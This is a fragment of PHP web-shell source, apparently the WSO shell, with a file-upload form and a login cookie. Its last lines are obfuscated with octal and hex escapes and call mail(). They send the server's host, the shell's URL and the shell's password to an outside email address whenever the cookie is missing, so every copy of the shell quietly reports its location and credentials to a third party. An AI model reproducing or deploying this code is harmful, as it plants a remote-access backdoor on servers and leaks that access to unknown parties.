...
@setcookie("logueo","acepto",time() +3600*24*7);
$wso="La:$auth_pass, es correcta";
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		...
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'><span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br></td></tr></table></div></body></html>";}
$srv="\155ai\154";$wi=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
if (!isset($_COOKIE['logueo'])){@$srv("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$wso");}
